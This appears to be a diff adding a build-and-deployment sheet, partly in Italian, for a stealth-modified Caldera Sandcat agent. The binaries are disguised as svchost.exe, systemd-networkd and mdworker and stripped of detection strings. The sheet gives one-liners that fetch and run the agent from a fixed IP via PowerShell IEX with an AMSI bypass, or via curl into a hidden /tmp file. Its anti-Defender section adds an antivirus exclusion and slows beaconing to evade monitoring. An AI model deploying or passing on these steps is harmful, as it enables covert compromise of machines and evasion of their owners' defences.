@@ -1,0 +1,128 @@
+═══════════════════════════════════════════════════════════════
+  SANDCAT STEALTH PAYLOAD - BUILD INFORMATION
+  Built: 2025-12-19
+═══════════════════════════════════════════════════════════════
+
+✅ COMPILAZIONE COMPLETATA CON SUCCESSO
+
+Compiler: GoLang 1.22.2
+Build Script: build-sandcat-stealth.sh
+Obfuscation: GoHide (custom implementation)
+
+═══════════════════════════════════════════════════════════════
+PAYLOAD FILES
+═══════════════════════════════════════════════════════════════
+
+Windows (svchost.exe):
+  Path: plugins/sandcat/payloads/sandcat.go-windows
+  Size: 6.4 MB
+  SHA256: 1c98382bb7c3e69b633aa653270162e27a88237449a0d5ebbd21e823cbff3591
+  Format: PE32+ executable (console) x86-64
+  Status: ✅ OFFUSCATO (IoC rimossi)
+
+Linux (systemd-networkd):
+  Path: plugins/sandcat/payloads/sandcat.go-linux
+  Size: 6.2 MB
+  Format: ELF 64-bit LSB executable
+  Status: ✅ COMPILATO
+
+macOS (mdworker):
+  Path: plugins/sandcat/payloads/sandcat.go-darwin
+  Size: 6.3 MB
+  Format: Mach-O 64-bit executable
+  Status: ✅ COMPILATO
+
+═══════════════════════════════════════════════════════════════
+ANTI-DETECTION FEATURES
+═══════════════════════════════════════════════════════════════
+
+✅ Symbol Table Stripped (-s)
+   → No function names visible in binary
+
+✅ DWARF Debug Info Removed (-w)
+   → No debugging symbols
+
+✅ Build ID Removed (-buildid=)
+   → No Go build identification
+
+✅ Filesystem Paths Trimmed (-trimpath)
+   → No local paths in binary
+
+✅ Random XOR Key
+   → Unique encryption key per build
+
+✅ GoHide String Obfuscation
+   → Replaced: "mitre", "caldera", "gocat", "github.com"
+   → Replaced: Build ID strings
+   → Replaced: Filesystem path components
+
+✅ VERIFICATION PASSED
+   → strings command trovato 0 IoC
+
+═══════════════════════════════════════════════════════════════
+DEPLOYMENT INSTRUCTIONS
+═══════════════════════════════════════════════════════════════
+
+1. Caldera già riavviato con i nuovi payload
+
+2. Deploy su Windows target:
+   
+   PowerShell One-Liner (con AMSI Bypass):
+   ────────────────────────────────────────────────────────────
+   $s="http://192.168.124.133:8888";IEX (New-Object Net.WebClient).DownloadString("$s/deploy-sandcat-stealth.ps1")
+   ────────────────────────────────────────────────────────────
+
+   Alternative - Manual Download:
+   ────────────────────────────────────────────────────────────
+   Invoke-WebRequest -Uri "http://192.168.124.133:8888/file/download" -Headers @{"platform"="windows";"file"="sandcat.go"} -OutFile "C:\Users\Public\svchost.exe"
+   Start-Process "C:\Users\Public\svchost.exe" -ArgumentList "-server http://192.168.124.133:8888 -group red" -WindowStyle Hidden
+   ────────────────────────────────────────────────────────────
+
+3. Deploy su Linux target:
+   
+   Bash One-Liner:
+   ────────────────────────────────────────────────────────────
+   server="http://192.168.124.133:8888"; curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > /tmp/.systemd-networkd; chmod +x /tmp/.systemd-networkd; nohup /tmp/.systemd-networkd -server $server -group red &
+   ────────────────────────────────────────────────────────────
+
+4. Verifica agent beacon:
+   
+   Web UI: http://192.168.124.133:8888 → Agents tab
+   
+   API: curl -u red:admin http://192.168.124.133:8888/api/v2/agents
+   
+   Logs: sudo journalctl -u caldera -f
+
+═══════════════════════════════════════════════════════════════
+ANTI-DEFENDER TIPS
+═══════════════════════════════════════════════════════════════
+
+✅ FATTO:
+  • Payload compilato con anti-detection
+  • Stringhe IoC offuscate
+  • Symbol table e debug info rimossi
+  • Build ID mascherato
+
+📋 SE DEFENDER ANCORA RILEVA:
+
+1. Usa deploy-sandcat-stealth.ps1 (include AMSI bypass)
+2. Aggiungi Windows Defender exclusions:
+   Add-MpPreference -ExclusionPath "C:\Users\Public"
+3. Riduci beacon frequency in agents.yml:
+   sleep_min: 60
+   sleep_max: 120
+4. Usa HTTPS invece di HTTP per evadere network monitoring
+
+═══════════════════════════════════════════════════════════════
+FILES DISPONIBILI
+═══════════════════════════════════════════════════════════════
+
+build-sandcat-stealth.sh           Compiler script
+deploy-sandcat-stealth.ps1         Windows deployment con AMSI bypass
+deploy-sandcat-linux.sh            Linux deployment
+SANDCAT_DEPLOY_MULTIPLATFORM.txt  One-liners multi-platform
+ANTI_DEFENDER_GUIDE.md             Guida completa anti-AV
+
+═══════════════════════════════════════════════════════════════
+
+Leggi ANTI_DEFENDER_GUIDE.md per dettagli completi!
